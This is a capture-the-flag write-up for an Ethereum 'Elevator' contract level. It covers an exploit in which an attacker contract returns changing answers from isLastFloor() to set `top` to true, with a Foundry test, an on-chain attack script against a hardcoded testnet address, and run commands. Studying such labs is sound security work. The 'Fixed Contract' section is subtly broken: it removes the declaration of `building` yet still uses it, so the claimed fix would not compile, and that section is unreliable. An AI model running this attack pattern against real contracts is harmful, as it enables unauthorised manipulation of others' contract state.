## 🎯 Objective

- This contract's objective is to turn the bool value of top from `false` to `true`
- And it should be done by the Main contract not from the interface.

---

## 📄 Contracts Overview

## Elevator

- This contract have 1 interface and 2 variable 
	- `Building`: interface contract
	- `top`: public visibility
	- `floor`: public visibility
```solidity
interface Building{
   function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
   bool public top;
   uint256 public floor;
   
   //Rest of the code logic
}
```

  
---

## 🧠 Vulnerability: Untrusted External Call / Interface Implementation Manipulation

- The vulnerability of this contract is to declare `Type Instance` inside a function.
```solidity
  
function goTo(uint256 _floor) public {
	Building building = Building(msg.sender);
	if (!building.isLastFloor(_floor)) {
	floor = _floor;
	top = building.isLastFloor(floor);
	}
}

```
- This contract used a type instance inside a function so any contract if call a `goTo()` function will be treated as Building Interface/contract by this contract.
- A `EOA` is will not be a a good option to exploit this contract as a type instance will expect a contract to interact with it or it will revert or throw type error while interacting.
  

---

## 🌪️ Attack Flow


- To exploit this contract the attacker must make a AttackContract that should have the same function name as per the Interface contract
- In this Contract the Interface Building have a function named `isLastFloor` so the attack contract should also have this function {constrains: the name and the parameters should be same to exploit the contract}.
```Attack
Attacker made a Attack contract having a contstructor that accpets the target contract address.
|
V
In the Attack contract, the Contract calls the goTO() function from the contract Elevator which make the AttackContract Building i.e becasue of Type Instance Declaration
After the goTo() function is called the AttackContract will be framed as the Building contract.
|
V
In the goTo() function, function isLastFloor() has been called twice.

	. as a parameter for if block
		if(!isLastFloor(_floor)){
			//code logic
		}
	. as a argument inside the if block for the variable top
		top = building.isLastFloor(floor);
|
V
As AttackContract is framed as Building contract so the AttackContract should have the function same as the building
attacker must make a isLastFloor() function in the AttackContract.
```
- After making the AttackContract it can be seen that the original `isLastFloor()` accpets uint256 as an argument and returns `bool` as a return value.
- As per the overview the contract must change the `top` value  to `true`.
- And for it a toggle and a good logic need to be declare,
```AttackContract
# without using toggle the flow 
!building.isLastFloor(_floor) => false 
stop the execution

{returns false as !(NOT) is used}
if any other argument is passed other than uint256 it will throw type error.

with toggle 

declare the toogle value true 
in the function logic 
if true => returns false 
if false => reurns true 

as if toggle value is true the it will return false 

!building.isLastFloor(_floor) => true
floor = _floor
top = building.isLastFloor(floor) => true
```
- So by this way the value of `top`  can be change to `true`. 
- And It is done by using the Elevator contract.
---

## 🧪 Test — TestElevator.t.sol

---

  

| TestName     | WhatitChecks                                                                                                |
| ------------ | ----------------------------------------------------------------------------------------------------------- |
| testAttack() | It checks the exploit, it checks after the attack contract is made the value of top changes to true or not. |



  

### Key exploit line (in test):

---

```solidity

function testAttack() public {
attack.attack(12);
assertEq(elevator.top(), true, "The elevator did not reach the top floor!");
}

```

- The key exploit in this test file is:
	- attack.attack(12) => it calls the goTo function from the Elevator 
	- which use type instance and make the Attack contract Building 
	- Uses the isLastFloor() function from the Attack contract not from the original building contract.
	- which changes the `top` value. 
---

## 🛡️ Fix

The fix is not to use type instance inside a function. If used inside the function then any contract that calls the function will be treated as the instance contract, any malicious contract can also treated as instance contract.

##### Current vulnerable contract

``` solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Building {
	function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
	bool public top;
	uint256 public floor;
	function goTo(uint256 _floor) public {
	Building building = Building(msg.sender);
		if (!building.isLastFloor(_floor)) {
			floor = _floor;
			top = building.isLastFloor(floor);
		}
	}
}
```

###### Fixed Contract

```// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Building {
	function isLastFloor(uint256) external view returns (bool);
}

contract Elevator {
	bool public top;
	uint256 public floor;
	
	function goTo(uint256 _floor) public {
		if (!building.isLastFloor(_floor)) {
			floor = _floor;
			top = building.isLastFloor(floor);
		}
	}
}
```
- Attack _requires_ changing a variable mid-attack to return two different answers, enforcing a strict "read-only" rule with `view` makes the attack completely impossible. The attacker is forced to return the exact same answer both times.
---

## 🚀 On-chain Attack — AttackElevatorScript.s.sol

---

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Script, console} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";
import {AttackElevator} from "../src/AttackElevator.sol";

contract AttackElevatorScript is Script {
	address targetInstance = 0xB91fb42e6805281A79d8f42e2bda9E7226e0eC13;
	
	Elevator public elevator;
	AttackElevator public attacker;

	function run() public {
		elevator = Elevator(targetInstance);
		vm.startBroadcast();
		attacker = new AttackElevator(address(elevator));
		attacker.attack(12);
		vm.stopBroadcast();
		console.log("The Top floor is reached.", elevator.top());
	}
}
```

-  attack.attack(12) => it calls the goTo function from the Elevator 
- which use type instance and make the Attack contract Building 
- Uses the isLastFloor() function from the Attack contract not from the original building contract.
- which changes the `top` value. 

---

## 🛠️ How to Run

---

### Run Tests (Local Anvil)

```bash

forge test --mt testAttack -vvvv

```

  

### Deploy & Attack (On-chain)

```bash

forge script script/AttackElevatorScript.s.sol --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY --broadcast

```

  

---
## 📁 Project Structure

```
├── src/
│   └──Elevator.sol
|	└──AttackElevator.sol        # call the attack function
├── script/
│   ├── ElevatorScript.s.sol
│   └── AttackELevatorScript.s.sol
└── test/
    └── TestElevetor.t.sol
```

